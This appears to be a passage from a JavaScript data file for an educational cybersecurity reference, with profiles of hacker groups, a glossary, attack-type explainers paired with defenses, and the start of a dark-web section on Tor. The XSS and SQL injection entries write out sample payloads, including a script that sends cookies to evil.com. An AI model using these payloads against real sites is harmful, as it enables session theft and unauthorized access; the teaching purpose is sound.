• NotPetya (June 2017) — used EternalBlue + DoublePulsar; most destructive malware ever ($10B+ damage)
• NSA forced to disclose multiple vulnerabilities to Microsoft

IDENTITY: Never definitively identified. Widely suspected to be Russian intelligence (SVR or GRU) based on writing patterns, timing (during US election), and strategic objectives. Some theorize a disgruntled NSA insider.`,
    meta: { identity: 'Unknown (suspected Russian state)', keyLeak: 'EternalBlue exploit', impactCost: '$14B+ (WannaCry + NotPetya)' }
  },
  {
    id: 'lapsus',
    name: 'Lapsus$',
    aka: 'DEV-0537',
    icon: '🧒',
    type: 'criminal-group',
    era: '2021–2022',
    nationality: 'British / Brazilian',
    status: 'Dismantled (partially)',
    tags: ['teenager', 'social engineering', 'MFA fatigue', 'extortion'],
    shortDesc: 'Teenage hackers who breached Microsoft, Nvidia, Samsung, Uber, and Rockstar Games.',
    content: `Lapsus$ (also known as DEV-0537 by Microsoft) was a threat actor group primarily composed of teenagers who conducted some of the most high-profile breaches of 2021–2022 without using sophisticated malware.

METHODS:
• Social engineering of employees and IT helpdesks
• MFA fatigue attacks (bombarding users with push notifications until they approve)
• Buying initial access from dark web brokers
• Recruiting insiders within target companies (advertised on Telegram)
• SIM swapping

MAJOR VICTIMS:
• NVIDIA: 1TB+ of data, GPU driver source code, employee credentials (used to sign malware with NVIDIA certs)
• Samsung: 190GB of source code, including biometric unlock algorithms
• Microsoft: Source code of Bing, Cortana, and other products
• Okta: Customer data (affected 375 companies)
• Uber: Full internal network access via MFA fatigue on contractor
• Rockstar Games: GTA VI development footage leaked
• T-Mobile, Vodafone, LG, Ubisoft

ARRESTS:
• 17-year-old leader "White" arrested in UK (Oxford) in 2022; convicted 2024
• Several members in Brazil arrested
• Multiple others charged across UK and US

SIGNIFICANCE: Proved that social engineering, not technical skills, is often the most effective attack vector.`,
    meta: { ages: 'Primarily 16–21', primaryMethod: 'Social engineering, MFA fatigue', arrested: '2022–2024' }
  }
],

// ──────────────────────────────────────────────
//  TERMINOLOGY
// ──────────────────────────────────────────────
terminology: [
  { id: 'zero-day', term: 'Zero-Day (0day)', abbr: '0day', category: 'vulnerability', def: 'A software vulnerability that is unknown to the vendor and has no available patch. Called "zero-day" because developers have had zero days to fix it. Extremely valuable — can sell for $1M+ on exploit markets.' },
  { id: 'cve', term: 'CVE', abbr: 'Common Vulnerabilities and Exposures', category: 'vulnerability', def: 'A standardized identifier (e.g., CVE-2021-44228) for publicly known cybersecurity vulnerabilities. Maintained by MITRE Corporation. Every public vulnerability gets a unique CVE number.' },
  { id: 'exploit', term: 'Exploit', abbr: null, category: 'attack', def: 'Code or technique that takes advantage of a software vulnerability to cause unintended behavior — typically to gain unauthorized access, escalate privileges, or execute arbitrary code.' },
  { id: 'payload', term: 'Payload', abbr: null, category: 'malware', def: 'The component of malware that performs the actual malicious action (data theft, encryption, destruction). Distinct from the delivery mechanism (dropper/loader) that gets it onto the system.' },
  { id: 'apt', term: 'APT', abbr: 'Advanced Persistent Threat', category: 'threat actor', def: 'A sophisticated, long-term cyberattack typically conducted by nation-states or organized criminal groups. Characterized by stealth, persistence (months/years), and specific high-value targets. Examples: Fancy Bear, Lazarus Group.' },
  { id: 'c2', term: 'C2 / C&C', abbr: 'Command and Control', category: 'infrastructure', def: 'Infrastructure used by attackers to remotely control malware on compromised systems. Malware "calls home" to the C2 server to receive instructions and send stolen data.' },
  { id: 'rat', term: 'RAT', abbr: 'Remote Access Trojan', category: 'malware', def: 'Malware that gives an attacker remote administrative control over an infected system. Features typically include screen capture, keylogging, file access, webcam/microphone access, and shell access.' },
  { id: 'rootkit', term: 'Rootkit', abbr: null, category: 'malware', def: 'Malware designed to conceal itself and other malicious software on a system, often at the kernel level. Makes detection extremely difficult. Stuxnet used a rootkit to hide its files from Windows.' },
  { id: 'keylogger', term: 'Keylogger', abbr: null, category: 'malware', def: 'Software (or hardware) that records every keystroke made on a device. Used to steal passwords, credit card numbers, and sensitive information. Can be software-based or physical (plugged between keyboard and computer).' },
  { id: 'pentest', term: 'Penetration Testing', abbr: 'Pentest', category: 'defense', def: 'Authorized simulated cyberattack on a system to evaluate its security. Pentesters (ethical hackers) use the same tools and techniques as attackers to find vulnerabilities before real attackers do.' },
  { id: 'red-team', term: 'Red Team', abbr: null, category: 'defense', def: 'A group of security professionals that simulates real-world attackers to test an organization\'s defenses. Goes beyond basic pentesting — includes physical intrusion, social engineering, and full attack simulation.' },
  { id: 'blue-team', term: 'Blue Team', abbr: null, category: 'defense', def: 'The defensive security team that protects an organization, detects threats, and responds to incidents. Includes SOC analysts, incident responders, and threat hunters.' },
  { id: 'purple-team', term: 'Purple Team', abbr: null, category: 'defense', def: 'Collaborative approach where red and blue teams work together simultaneously to improve defenses. Red team attacks while blue team improves detection and response in real-time.' },
  { id: 'soc', term: 'SOC', abbr: 'Security Operations Center', category: 'defense', def: 'A centralized unit staffed by security analysts who monitor, detect, analyze, and respond to cybersecurity incidents 24/7. The "nerve center" of an organization\'s security.' },
  { id: 'siem', term: 'SIEM', abbr: 'Security Information and Event Management', category: 'defense', def: 'Software that aggregates and analyzes log data from across an organization\'s IT infrastructure in real-time. Used by SOCs to detect threats. Examples: Splunk, IBM QRadar, Microsoft Sentinel.' },
  { id: 'ioc', term: 'IOC', abbr: 'Indicator of Compromise', category: 'threat intel', def: 'Artifacts (IP addresses, domain names, file hashes, URLs) that indicate a system has been compromised. Used by threat intelligence platforms to detect attacks.' },
  { id: 'ttp', term: 'TTP', abbr: 'Tactics, Techniques, and Procedures', category: 'threat intel', def: 'Describes how threat actors operate. Tactics = high-level goals (e.g., initial access). Techniques = how they achieve it (e.g., spearphishing). Procedures = specific implementation details.' },
  { id: 'osint', term: 'OSINT', abbr: 'Open Source Intelligence', category: 'recon', def: 'Collection and analysis of information from publicly available sources (social media, public records, job postings, DNS records) to gather intelligence about targets before an attack or investigation.' },
  { id: 'social-engineering-term', term: 'Social Engineering', abbr: null, category: 'attack', def: 'Psychological manipulation of people into divulging information or performing actions that compromise security. Exploits trust, authority, urgency, and fear rather than technical vulnerabilities.' },
  { id: 'doxing', term: 'Doxing', abbr: null, category: 'harassment', def: 'Researching and publicly publishing private information about an individual (real name, address, employer, family members) without their consent. Used for harassment, intimidation, or enabling physical attacks.' },
  { id: 'opsec', term: 'OPSEC', abbr: 'Operational Security', category: 'defense', def: 'The process of protecting sensitive information from adversaries. In cybersecurity, refers to practices that prevent revealing your identity, location, or intentions during sensitive operations.' },
  { id: 'lateral-movement', term: 'Lateral Movement', abbr: null, category: 'attack', def: 'Techniques attackers use to progressively move through a network after gaining initial access, seeking higher privileges and access to more sensitive systems and data.' },
  { id: 'privilege-escalation', term: 'Privilege Escalation', abbr: 'PrivEsc', category: 'attack', def: 'Exploiting vulnerabilities or misconfigurations to gain higher-level permissions than originally granted. Vertical PrivEsc = gaining admin/root. Horizontal PrivEsc = accessing another user\'s resources.' },
  { id: 'ctf', term: 'CTF', abbr: 'Capture The Flag', category: 'training', def: 'Cybersecurity competitions where participants solve security challenges to find hidden "flags" (text strings). Categories include web exploitation, reverse engineering, cryptography, forensics, and pwn (binary exploitation). Great for learning.' },
  { id: 'vpn', term: 'VPN', abbr: 'Virtual Private Network', category: 'privacy', def: 'Encrypts internet traffic and routes it through a server, masking the user\'s real IP address. Used for privacy, bypassing geo-restrictions, and securing connections on public Wi-Fi.' },
  { id: 'tor', term: 'Tor', abbr: 'The Onion Router', category: 'privacy', def: 'Anonymity network that routes traffic through multiple volunteer-operated nodes (relays), encrypting it at each step. Used to access .onion sites on the dark web. Provides strong anonymity but is slow.' },
  { id: 'mfa', term: 'MFA', abbr: 'Multi-Factor Authentication', category: 'defense', def: 'Authentication requiring two or more verification factors: something you know (password), something you have (phone), something you are (biometric). Prevents most account takeover attacks even if password is stolen.' },
  { id: 'sql-injection-term', term: 'SQL Injection', abbr: 'SQLi', category: 'attack', def: 'Inserting malicious SQL code into input fields to manipulate database queries. Can result in data theft, authentication bypass, or database destruction. One of the most common and dangerous web vulnerabilities.' },
  { id: 'xss-term', term: 'Cross-Site Scripting', abbr: 'XSS', category: 'attack', def: 'Injecting malicious scripts into web pages viewed by other users. Scripts execute in victims\' browsers, enabling cookie theft, session hijacking, and phishing overlays.' },
  { id: 'buffer-overflow', term: 'Buffer Overflow', abbr: null, category: 'attack', def: 'Writing more data to a buffer than it can hold, overwriting adjacent memory. Can allow attackers to overwrite return addresses and redirect execution to attacker-controlled code. Classic technique in exploit development.' },
  { id: 'threat-hunting', term: 'Threat Hunting', abbr: null, category: 'defense', def: 'Proactive search through networks and systems to detect threats that have evaded automated security tools. Threat hunters use hypotheses, analytics, and intelligence to find hidden attackers.' },
  { id: 'maas', term: 'MaaS / RaaS', abbr: 'Malware/Ransomware as a Service', category: 'criminal model', def: 'Criminal business model where malware developers rent their tools to affiliates who conduct attacks. Affiliates share a percentage of proceeds with developers. Lowered the technical barrier to cybercrime significantly.' }
],

// ──────────────────────────────────────────────
//  ATTACK TYPES
// ──────────────────────────────────────────────
attacks: [
  {
    id: 'sql-injection',
    name: 'SQL Injection',
    icon: '💉',
    severity: 'critical',
    category: 'Web Application',
    tags: ['OWASP Top 10', 'database', 'web', 'classic'],
    shortDesc: 'Injecting malicious SQL queries to manipulate or extract database contents.',
    content: `SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query. Attackers manipulate SQL queries to bypass authentication, extract data, modify data, or execute commands.

TYPES:
• In-band SQLi (Classic) — results returned directly in the application response
  - Error-based: Triggers database errors that reveal information
  - Union-based: Uses UNION SQL operator to retrieve data from other tables
• Blind SQLi — no data returned directly; requires inference
  - Boolean-based: Ask true/false questions ("Is the first character of admin password 'a'?")
  - Time-based: Uses SLEEP() to infer answers via response time
• Out-of-band SQLi — uses alternative channels (DNS, HTTP requests) to exfiltrate data

EXAMPLE PAYLOAD:
  ' OR '1'='1' --
  This turns: SELECT * FROM users WHERE username='input' AND password='input'
  Into:        SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
  Result: Logs in as first user in database (often admin)

TOOLS: sqlmap (automated), Burp Suite, Havij

DEFENSE: Parameterized queries/prepared statements, stored procedures, input validation, WAF, least privilege DB accounts.

PREVALENCE: #1 or #2 most common web vulnerability for 15+ years (OWASP Top 10).`
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    icon: '📜',
    severity: 'high',
    category: 'Web Application',
    tags: ['OWASP Top 10', 'browser', 'javascript', 'session hijacking'],
    shortDesc: 'Injecting malicious scripts into web pages viewed by other users.',
    content: `XSS attacks inject client-side scripts into web pages. When other users view the page, the malicious script executes in their browser with the same trust level as the legitimate website.

TYPES:
• Reflected XSS — malicious script is in the URL; executed when victim clicks crafted link. Not stored.
• Stored (Persistent) XSS — script stored in database (e.g., in comments); executes for every visitor. Most dangerous.
• DOM-based XSS — script modifies the DOM in the victim's browser; never touches server

WHAT ATTACKERS CAN DO:
• Steal session cookies (document.cookie) → account takeover
• Capture keystrokes and form data
• Redirect users to phishing pages
• Perform actions on behalf of the user (CSRF-like)
• Install browser-based cryptominer
• Create fake login forms (phishing overlay)
• BeEF (Browser Exploitation Framework) — hook browsers for persistent control

CLASSIC PAYLOAD: <script>document.location='https://evil.com/steal?c='+document.cookie</script>

DEFENSE: Output encoding (HTML entity encoding), Content Security Policy (CSP) headers, HttpOnly cookie flag, input validation, modern frameworks (React, Angular) auto-escape by default.`
  },
  {
    id: 'mitm',
    name: 'Man-in-the-Middle (MITM)',
    icon: '🕵️',
    severity: 'high',
    category: 'Network',
    tags: ['network', 'interception', 'ARP', 'SSL stripping'],
    shortDesc: 'Intercepting and potentially altering communications between two parties.',
    content: `A MITM attack occurs when an attacker secretly relays and possibly alters the communications between two parties who believe they are directly communicating with each other.

TECHNIQUES:
• ARP Poisoning/Spoofing — sends fake ARP replies to associate attacker's MAC with victim's IP; works on LAN
• DNS Spoofing — responds to DNS queries with forged records, redirecting traffic
• Evil Twin — sets up rogue Wi-Fi hotspot with same SSID as legitimate network
• SSL Stripping — downgrades HTTPS connections to HTTP (bypassed by HSTS)
• BGP Hijacking — rerouting internet traffic by poisoning BGP routing tables (nation-state level)
• SSL/TLS Interception — enterprise "SSL inspection" proxies use this legitimately

TOOLS: Ettercap, Bettercap, Wireshark, mitmproxy, SSLstrip

WHAT CAN BE STOLEN: Login credentials, session tokens, credit card numbers, any unencrypted data

REAL WORLD: Public Wi-Fi hotspots are prime MITM environments. Starbucks, airports, hotels.

DEFENSE: HTTPS everywhere, HSTS, certificate pinning, VPN on public Wi-Fi, DNSSEC, avoid public Wi-Fi for sensitive transactions.`
  },
  {
    id: 'brute-force',
    name: 'Brute Force & Credential Attacks',
    icon: '🔨',
    severity: 'high',
    category: 'Authentication',
    tags: ['password', 'authentication', 'wordlist', 'credential stuffing'],
    shortDesc: 'Systematically trying all possible passwords or using known credentials to gain access.',
    content: `Brute force attacks attempt to gain access by systematically checking all possible passwords or keys until the correct one is found.

TYPES:
• Pure Brute Force — try every possible combination (impractical for long passwords)
• Dictionary Attack — try words from a wordlist (rockyou.txt has 14.3M passwords)
• Credential Stuffing — use known username/password pairs from breached databases against other sites
• Password Spraying — try one common password against many accounts (avoids lockouts)
• Rainbow Table Attack — precomputed hash lookup tables to crack password hashes instantly

TOOLS:
• Hydra — network login brute-forcer (SSH, FTP, HTTP, RDP, etc.)
• John the Ripper — offline password hash cracking
• Hashcat — GPU-accelerated hash cracking (world's fastest; 100B+ hashes/second for MD5)
• CrackStation, cmd5 — online hash lookup tables
• Burp Suite — web application brute forcing

CREDENTIAL STUFFING SCALE: 90% of web application login traffic is credential stuffing (Akamai 2022). Attackers use lists of billions of stolen credentials.

DEFENSE: MFA (most effective), account lockout policies, CAPTCHA, password managers, breach detection (HaveIBeenPwned API integration), bcrypt/Argon2 for password hashing.`
  },
  {
    id: 'phishing-attack',
    name: 'Spear Phishing & BEC',
    icon: '🎯',
    severity: 'critical',
    category: 'Social Engineering',
    tags: ['email', 'targeted', 'CEO fraud', 'initial access'],
    shortDesc: 'Targeted phishing using personal information; Business Email Compromise.',
    content: `Spear phishing is a targeted form of phishing aimed at specific individuals using personalized information. Business Email Compromise (BEC) is a sophisticated spear phishing variant targeting businesses.

SPEAR PHISHING:
• Uses OSINT to craft highly convincing messages
• References real colleagues, projects, or events
• Often delivers malware or credential harvesting pages
• Used as initial access vector by APTs (Fancy Bear, Lazarus, Cozy Bear)

BUSINESS EMAIL COMPROMISE (BEC):
• Attacker impersonates CEO, CFO, or vendor
• Requests urgent wire transfer or gift card purchase
• Often sent when target executive is traveling (known via LinkedIn/social media)
• FBI IC3: BEC caused $2.7B in losses in 2022 alone
• Average loss per incident: $130,000

BEC TECHNIQUES:
• Domain spoofing (ceo@company-inc.com vs company.com)
• Lookalike domains (rn looks like m)
• Compromised legitimate email accounts (most convincing)
• Display name spoofing

HIGH-PROFILE BEC CASES:
• Facebook and Google: $100M stolen via fake invoice fraud (Lithuanian hacker Evaldas Rimasauskas, sentenced 5 years)
• Toyota Boshoku: $37M lost in BEC wire transfer (2019)

DEFENSE: Email authentication (SPF, DKIM, DMARC), employee training, callback verification for wire transfers, MFA on email accounts.`
  },
  {
    id: 'ransomware-attack',
    name: 'Ransomware Deployment',
    icon: '🔒',
    severity: 'critical',
    category: 'Malware',
    tags: ['encryption', 'extortion', 'double extortion', 'RaaS'],
    shortDesc: 'Full attack chain: initial access through ransomware deployment and extortion.',
    content: `Modern ransomware attacks are multi-stage operations conducted by organized criminal groups, often taking weeks from initial access to ransomware deployment.

FULL ATTACK CHAIN (MITRE ATT&CK):
1. INITIAL ACCESS: Phishing email, RDP brute force, VPN vulnerability, supply chain, purchased access
2. EXECUTION: PowerShell, WMI, malicious macro, direct execution
3. PERSISTENCE: Registry Run keys, scheduled tasks, new admin accounts
4. PRIVILEGE ESCALATION: Token impersonation, kernel exploits, credential dumping
5. DEFENSE EVASION: Disable AV/EDR, clear logs, living-off-the-land (LOLBins)
6. CREDENTIAL ACCESS: Mimikatz, Cobalt Strike, LSASS dump, DCSync
7. DISCOVERY: Network scanning, Active Directory enumeration, file server mapping
8. LATERAL MOVEMENT: Pass-the-hash, RDP, PsExec, SMB
9. EXFILTRATION: Steal data for double/triple extortion (Rclone to cloud)
10. IMPACT: Deploy ransomware, encrypt files, drop ransom note

DOUBLE EXTORTION: Encrypt files AND threaten to publish stolen data unless ransom paid.
TRIPLE EXTORTION: Also DDoS the victim and/or contact victim's customers.

TOOLS USED: Cobalt Strike (C2), Mimikatz (credential theft), BloodHound (AD mapping), Rclone (exfil).

DEFENSE: Offline backups (3-2-1 rule), EDR, network segmentation, MFA everywhere, patch management, privileged access management.`
  },
  {
    id: 'supply-chain',
    name: 'Supply Chain Attack',
    icon: '⛓️',
    severity: 'critical',
    category: 'Advanced',
    tags: ['software supply chain', 'dependency', 'SolarWinds', 'nation-state'],
    shortDesc: 'Compromising a target by attacking a trusted vendor or software dependency.',
    content: `Supply chain attacks target less-secure elements in the supply chain (vendors, software dependencies, build pipelines) to reach the actual target indirectly. Extremely difficult to detect and defend against.

TYPES:
• Software Build Pipeline: Compromise developer systems or build server to insert malicious code (SolarWinds)
• Software Update Mechanism: Trojanize legitimate software updates (SolarWinds, ASUS Live Update)
• Open Source Dependencies: Compromise npm/PyPI packages used by many developers (event-stream attack, xz utils backdoor 2024)
• Hardware Supply Chain: Insert malicious chips or firmware (theoretical; Bloomberg "Big Hack" claims)
• Managed Service Provider (MSP): Compromise IT service provider to access all their clients (Kaseya)

NOTABLE CASES:
• SolarWinds (2020): Russian SVR modified Orion build; 18,000+ customers received backdoored update
• Kaseya VSA (2021): REvil used VSA vulnerability to push ransomware to 1,500+ businesses
• xz Utils (2024): Social engineer contributed backdoor to widely-used Linux compression library (Jia Tan persona; found before widespread exploitation)
• 3CX (2023): North Korean supply chain attack via trojanized trading app → 3CX desktop app

WHY IT WORKS: Organizations trust signed software from known vendors. Supply chain attacks weaponize that trust.

DEFENSE: Software composition analysis (SCA), code signing verification, network segmentation, SBOM (Software Bill of Materials), vendor risk assessments.`
  },
  {
    id: 'buffer-overflow-attack',
    name: 'Buffer Overflow / Memory Corruption',
    icon: '💾',
    severity: 'critical',
    category: 'Binary Exploitation',
    tags: ['memory', 'pwn', 'exploit dev', 'shellcode', 'ROP'],
    shortDesc: 'Overwriting memory buffers to redirect program execution or crash systems.',
    content: `Buffer overflow vulnerabilities occur when a program writes more data to a buffer than it can hold, overflowing into adjacent memory. Attackers craft inputs to overwrite critical data structures and redirect code execution.

TYPES:
• Stack-based Buffer Overflow — overflows stack buffer; overwrites return address; classic technique
• Heap-based Buffer Overflow — overflows heap allocations; harder to exploit; use-after-free
• Integer Overflow — arithmetic overflow causes incorrect buffer size calculation
• Format String Vulnerability — misuse of printf() family functions

EXPLOITATION TECHNIQUES:
• Shellcode injection — inject and execute arbitrary machine code
• Return-Oriented Programming (ROP) — chain existing code gadgets to bypass NX/DEP
• Return-to-libc — return to existing library functions (system(), exec())
• Heap Spraying — fill heap with shellcode to increase exploit reliability

MODERN PROTECTIONS:
• ASLR (Address Space Layout Randomization) — randomize memory locations
• NX/DEP (Non-Executable Memory) — prevent executing data as code
• Stack Canaries — detect stack corruption before return
• CFI (Control Flow Integrity) — prevent arbitrary control flow hijacking
• SafeStack, ShadowStack

FAMOUS EXPLOITS: MS08-067 (Conficker), EternalBlue (MS17-010), Morris Worm sendmail exploit.

TOOLS: pwntools, GDB+pwndbg/peda, pwndbg, ROPgadget, checksec.`
  },
  {
    id: 'social-engineering-attack',
    name: 'Social Engineering Attacks',
    icon: '🎭',
    severity: 'high',
    category: 'Human',
    tags: ['psychology', 'manipulation', 'pretexting', 'vishing'],
    shortDesc: 'Psychological manipulation bypassing technical security through human deception.',
    content: `Social engineering exploits human psychology rather than software vulnerabilities. It's the most consistently successful attack technique because humans are always the weakest link.

TECHNIQUES:
• Pretexting — fabricating a scenario ("Hi, I'm from IT, I need your password to fix your email")
• Baiting — leaving infected USB drives labeled "Salary Information Q3" in parking lots
• Quid Pro Quo — "I'll fix your computer if you give me remote access"
• Tailgating — following someone through a secure door
• Vishing — phone-based social engineering (IRS scams, tech support scams)
• Smishing — SMS phishing ("Your package is held; click here")
• Watering Hole — compromise sites frequently visited by targets

PSYCHOLOGICAL PRINCIPLES EXPLOITED:
• Authority ("I'm the CEO / IRS agent / Microsoft support")
• Urgency ("Your account will be deleted in 24 hours")
• Scarcity ("Only 5 slots available for the security update")
• Social Proof ("All your colleagues have already updated")
• Reciprocity (give a small gift first to create obligation)
• Liking (build rapport before the ask)
• Fear ("You've been hacked. Act now.")

CLASSIC SOCIAL ENGINEERING SCRIPTS:
Kevin Mitnick's approach: "Hi, this is Dave from IT. We're seeing some unusual activity on your account. I just need to verify your password to check the logs."

DEFENSE: Security awareness training (regular phishing simulations), verification procedures, "no exceptions" security policies, callback verification.`
  },
  {
    id: 'zero-day-attack',
    name: 'Zero-Day Exploit',
    icon: '💣',
    severity: 'critical',
    category: 'Advanced',
    tags: ['0day', 'vulnerability', 'unpatched', 'exploit market'],
    shortDesc: 'Exploiting an unknown, unpatched vulnerability before the vendor can respond.',
    content: `A zero-day exploit takes advantage of a software vulnerability that is unknown to the software vendor and therefore has no available patch. Extremely valuable — nation-states, criminals, and researchers all hunt for them.

ZERO-DAY MARKET:
• Nation-states: NSA, GCHQ, FSB, PLA purchase 0days for millions
• Broker firms: Zerodium, Vupen/Crowdfense pay $2.5M+ for iOS full-chain remote code execution
• Bug bounty (responsible disclosure): $100K–$1M+ via HackerOne, Bugcrowd, vendor programs
• Criminal market: Underground forums sell 0days for $50K–$500K+
• Typical pricing: iOS RCE = $2.5M, Android RCE = $2.5M, Windows LPE = $400K, browser = $50K–$500K

NOTABLE ZERO-DAYS:
• Stuxnet — used 4 zero-days simultaneously (unprecedented)
• EternalBlue (MS17-010) — NSA zero-day leaked by Shadow Brokers
• Log4Shell (CVE-2021-44228) — Log4j RCE; one of most critical ever (CVSS 10.0)
• ProxyLogon/ProxyShell — Microsoft Exchange; exploited by 10+ APT groups
• Heartbleed (CVE-2014-0160) — OpenSSL; leaked private keys and passwords

LIFECYCLE:
Discovery → Weaponization → Use in limited attacks → Public disclosure → Patch released → Patch applied → Threat mitigated

TIME TO EXPLOIT: Attackers exploit known vulnerabilities within 15 minutes of public disclosure (Palo Alto Networks 2022 study).

DEFENSE: Patch rapidly, network segmentation, application whitelisting, EDR, virtual patching via WAF/IPS.`
  },
  {
    id: 'ddos-attack',
    name: 'DDoS Attack Techniques',
    icon: '🌊',
    severity: 'high',
    category: 'Network',
    tags: ['botnet', 'amplification', 'layer 7', 'SYN flood'],
    shortDesc: 'Technical breakdown of Distributed Denial of Service attack methods.',
    content: `DDoS attacks aim to exhaust resources (bandwidth, connections, CPU) of target systems to deny service to legitimate users.

VOLUMETRIC ATTACKS (flood bandwidth):
• UDP Flood — send massive amounts of UDP packets to random ports
• ICMP Flood (Ping Flood) — overwhelm with ping requests
• DNS Amplification — send small DNS requests spoofed as victim; get large responses sent to victim (28x–54x amplification)
• NTP Amplification — exploit NTP monlist command (556x amplification)
• Memcached Amplification — largest amplification factor (51,000x); led to 1.7 Tbps attack on GitHub 2018

PROTOCOL ATTACKS (exhaust connection tables):
• SYN Flood — send massive SYN packets without completing TCP handshake; fills connection table
• Ping of Death — send oversized ping packets that crash older systems
• Smurf Attack — ICMP flood using broadcast amplification

APPLICATION LAYER ATTACKS (Layer 7):
• HTTP Flood — send legitimate-looking HTTP GET/POST requests; hard to distinguish from real traffic
• Slowloris — keep HTTP connections open with partial requests; exhausts connection limits
• ReDoS — Regular Expression Denial of Service

HTTP/2 RAPID RESET (2023): New technique cancelling streams immediately; achieved 398M requests/second.

TOOLS: LOIC, HOIC (public), hping3, Scapy, custom botnets (criminal).

DEFENSE: DDoS protection services (Cloudflare, Akamai, AWS Shield), anycast network diffusion, rate limiting, geo-blocking, traffic scrubbing centers.`
  },
  {
    id: 'arp-poisoning',
    name: 'ARP Poisoning / Spoofing',
    icon: '🔀',
    severity: 'medium',
    category: 'Network',
    tags: ['LAN', 'ARP', 'MITM', 'network'],
    shortDesc: 'Sending fake ARP messages to link attacker\'s MAC with a legitimate IP address.',
    content: `ARP (Address Resolution Protocol) Poisoning corrupts ARP caches of devices on a local network, enabling man-in-the-middle attacks.

HOW ARP WORKS: Devices use ARP to find the MAC address associated with an IP address on the LAN. ARP has no authentication — any device can send fake ARP replies.

HOW THE ATTACK WORKS:
1. Attacker sends gratuitous ARP replies to victim: "IP 192.168.1.1 (router) is at [ATTACKER MAC]"
2. Attacker sends gratuitous ARP replies to router: "IP 192.168.1.50 (victim) is at [ATTACKER MAC]"
3. Both devices update their ARP caches with incorrect information
4. All traffic between victim and router now flows through attacker
5. Attacker enables IP forwarding so traffic continues to flow (victim suspects nothing)
6. Attacker can sniff, modify, or drop any packets

TOOLS: Ettercap, Bettercap, arpspoof (dsniff)

WHAT CAN BE CAPTURED: HTTP credentials (cleartext), Telnet/FTP sessions, unencrypted emails, any plaintext protocol traffic.

DEFENSE: Dynamic ARP Inspection (DAI) on managed switches, static ARP entries for critical systems, encrypted protocols (HTTPS, SSH), network monitoring for ARP anomalies.`
  },
  {
    id: 'privilege-esc',
    name: 'Privilege Escalation',
    icon: '⬆️',
    severity: 'high',
    category: 'Post-Exploitation',
    tags: ['Linux', 'Windows', 'kernel exploit', 'misconfig'],
    shortDesc: 'Gaining higher privileges than initially granted after gaining system access.',
    content: `After gaining initial access (often as a low-privilege user), attackers escalate to administrator/root to have full control.

WINDOWS PRIVILEGE ESCALATION:
• Unquoted service paths — services with spaces in paths can be hijacked
• Weak service/registry permissions — overwrite service binaries or modify registry
• AlwaysInstallElevated — MSI packages run as SYSTEM
• Token impersonation — steal tokens of privileged processes (Incognito, Juicy Potato, Sweet Potato)
• DLL Hijacking — place malicious DLL where privileged program will load it
• Pass-the-Hash/Pass-the-Ticket — use captured credential hashes without cracking
• Kernel exploits — e.g., PrintNightmare (CVE-2021-1675), EternalBlue

LINUX PRIVILEGE ESCALATION:
• SUID/SGID binaries — find programs that run as root; abuse them (GTFOBins)
• Sudo misconfigurations — sudo -l; (ALL) NOPASSWD: /usr/bin/vim → escape to shell
• Writable cron jobs — replace script run by root cron job
• Weak file permissions — world-writable /etc/passwd, shadow file
• Kernel exploits — Dirty COW, DirtyPipe, Sudo Baron Samedit
• Path injection — modify PATH variable; called command executes attacker's binary

TOOLS: WinPEAS, LinPEAS, PowerUp, BeRoot, GTFOBins, PEASS-ng

KEY RULE: Always run linpeas.sh or winpeas.exe first; they automate ~80% of PrivEsc checking.`
  },
  {
    id: 'web-app-attacks',
    name: 'OWASP Top 10 Web Attacks',
    icon: '🌐',
    severity: 'high',
    category: 'Web Application',
    tags: ['OWASP', 'web security', 'web app', 'vulnerability'],
    shortDesc: 'The 10 most critical web application security risks (OWASP 2021).',
    content: `The OWASP Top 10 is the definitive list of the most critical web application security risks.

OWASP TOP 10 (2021):
A01 - BROKEN ACCESS CONTROL (up from #5)
  Restrictions not properly enforced; users access unauthorized resources
  Example: Changing user ID in URL to see another user's account

A02 - CRYPTOGRAPHIC FAILURES
  Sensitive data exposed due to weak/absent encryption
  Example: Passwords stored as MD5 hashes, HTTP instead of HTTPS

A03 - INJECTION (SQL, NoSQL, OS, LDAP)
  Untrusted data sent to interpreter as command
  Example: SQLi, OS command injection

A04 - INSECURE DESIGN
  Missing or ineffective security controls by design
  Example: No rate limiting on forgot password, no business logic validation

A05 - SECURITY MISCONFIGURATION
  Default credentials, open cloud storage, verbose error messages
  Example: AWS S3 bucket publicly readable, default admin:admin credentials

A06 - VULNERABLE COMPONENTS
  Using libraries/frameworks with known vulnerabilities
  Example: Log4Shell (Log4j CVE-2021-44228), Spring4Shell

A07 - IDENTIFICATION/AUTHENTICATION FAILURES
  Session management weaknesses, weak passwords, missing MFA
  Example: Predictable session tokens, no account lockout

A08 - SOFTWARE & DATA INTEGRITY FAILURES
  Code/infrastructure not verified for integrity
  Example: Insecure deserialization, untrusted CDN content, CI/CD compromise

A09 - LOGGING & MONITORING FAILURES
  Insufficient logging prevents breach detection
  Example: Failed logins not logged, no alerting on suspicious activity

A10 - SERVER-SIDE REQUEST FORGERY (SSRF)
  Server fetches remote resource without validating user-supplied URL
  Example: Attacker makes server access internal services (AWS metadata: 169.254.169.254)`
  }
],

// ──────────────────────────────────────────────
//  DARK / DEEP WEB
// ──────────────────────────────────────────────
darkweb: {
  layers: [
    {
      name: 'Surface Web',
      color: '#00ff41',
      size: '4–5% of internet',
      desc: 'Publicly accessible content indexed by search engines (Google, Bing). Websites, news, social media, YouTube. What most people call "the internet."'
    },
    {
      name: 'Deep Web',
      color: '#00d4ff',
      size: '90–95% of internet',
      desc: 'Content not indexed by search engines. Includes your email inbox, banking portals, private databases, medical records, intranet sites, paywalled content. Mostly legitimate — not inherently criminal.'
    },
    {
      name: 'Dark Web',
      color: '#a855f7',
      size: '~0.01% of internet',
      desc: 'A subset of the deep web accessible only through special software (Tor, I2P). Intentionally hidden. Contains both legitimate (privacy-focused journalism, censorship circumvention) and highly illegal content.'
    }
  ],
  entries: [
    {
      id: 'tor-network',
      name: 'Tor Network',
      icon: '🧅',
      tags: ['anonymity', 'onion routing', 'privacy'],
      shortDesc: 'The primary anonymity network used to access the dark web.',
      content: `Tor (The Onion Router) was originally developed by the US Naval Research Laboratory in the mid-1990s for protecting US intelligence communications. It was publicly released in 2002.

HOW TOR WORKS:
1. Your traffic is encrypted in multiple layers (like an onion)
2. Routed through a circuit of 3 volunteer-operated relays (nodes):
   - Guard/Entry node: knows your real IP, not destination
   - Middle relay: knows neither source nor destination
   - Exit node: knows destination, not your real IP
3. Each relay decrypts one layer — no single relay knows full path
